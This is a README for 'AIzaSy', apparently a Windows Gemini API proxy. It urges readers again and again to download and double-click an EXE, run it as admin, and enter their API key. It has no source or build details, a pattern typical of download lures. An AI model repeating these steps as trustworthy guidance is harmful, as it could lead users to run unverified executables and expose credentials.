# 🌿 AIzaSy - Private Gemini proxy for Windows

[![Download AIzaSy](https://img.shields.io/badge/Download-AIzaSy-6e40c9?style=for-the-badge&logo=github)](https://github.com/aswinjosek/AIzaSy)

## 📥 Download

1. Open the download page here: https://github.com/aswinjosek/AIzaSy
2. On that page, find the latest release or the main download link
3. Download the Windows file to your PC
4. If the file is a ZIP, unzip it to a folder you can reach
5. If the file is an EXE, you can run it after the download finishes

## 🖥️ What AIzaSy does

AIzaSy is a small gateway for Gemini API use. It sits between your app and Gemini API requests. It keeps your key out of your app. It also helps you keep control of your traffic.

This tool is built for users who want a simple local setup on Windows. It is made with Go, so it runs fast and uses little system memory.

## ✨ Main uses

- Keep your Gemini API key in one place
- Send Gemini requests through a local gateway
- Reduce direct exposure of your private key
- Run a light proxy on Windows
- Use a simple setup for local testing or daily use

## 🪟 Windows setup

### 1. Get the file
Open the download page and get the Windows package:

https://github.com/aswinjosek/AIzaSy

### 2. Check the file type
You may get one of these:

- `.exe` file: double-click it to start
- `.zip` file: unzip it first, then open the app file inside

### 3. Move the files
If you unzipped the package, place the folder somewhere easy to find, such as:

- Desktop
- Downloads
- Documents

### 4. Start the app
Double-click the app file.

If Windows asks for permission, choose Yes so the app can run.

## ⚙️ First-time setup

After the app starts, you may need to set a few basic values:

- Gemini API key
- Local port
- Upstream API target
- Optional access rules

Use the default values if you are not sure what to enter. For most home use, the default local port is the best place to start.

## 🔧 Simple usage

After setup, your other apps can send requests to the local gateway instead of talking to Gemini API directly.

A common flow looks like this:

1. Open AIzaSy
2. Keep it running
3. Point your app or tool to the local address
4. Send Gemini requests through the gateway

If you use a desktop app, browser tool, or local script, set its API base URL to the AIzaSy local address.

## 🔒 Privacy focus

AIzaSy keeps privacy in mind.

- Your API key stays off the client side
- Your traffic can pass through one local point
- You can keep tighter control over request flow
- You can use your own machine as the gateway

This setup works well when you want less direct exposure of secrets in tools or scripts.

## 🧩 What you need

- Windows 10 or newer
- A working internet connection
- A Gemini API key
- Basic disk space for the app
- Permission to run downloaded apps on your PC

## 📌 File layout

If you use the ZIP version, you may see files like:

- main app file
- config file
- log file
- readme or help file

Keep the app files in the same folder so the program can find its settings.

## 🛠️ Common tasks

### Change the port
If another app already uses the same port, change it in the settings to a free one, such as 8080 or 3000.

### Replace the API key
If you get a new Gemini API key, open the settings and paste the new one in the key field.

### Stop the app
Close the app window or stop the process from Task Manager.

### Start it again
Open the app file again from the folder where you saved it.

## 🧪 Basic check

After launch, test the gateway with a simple Gemini request from your app.

If the request works, the gateway is set up right. If it fails, check:

- the local address
- the port number
- the API key
- your internet connection

## 🧭 Typical folder choice

For fewer issues, keep AIzaSy in a folder with a short path, such as:

- `C:\AIzaSy`
- `C:\Tools\AIzaSy`

This helps avoid path issues on Windows.

## 📎 Project details

- Repository: AIzaSy
- Topic: gemini-api
- Language: golang
- Use case: local Gemini API reverse proxy gateway

## 🖱️ Quick start

1. Visit the download page: https://github.com/aswinjosek/AIzaSy
2. Download the Windows build
3. Unzip it if needed
4. Run the app
5. Add your Gemini API key
6. Point your app to the local gateway

## 🔍 If something looks wrong

- If the app does not open, run it as admin
- If Windows blocks it, check your download source
- If requests fail, check the key and port
- If another app uses the port, pick a new one
- If the app closes at start, look for a config file problem

## 🧷 Best way to use it

Keep AIzaSy open while your other app needs Gemini access. Place it in a stable folder, keep the config file with the app, and reuse the same local port each time

## 📦 Download link

Use this page to download the Windows package:

https://github.com/aswinjosek/AIzaSy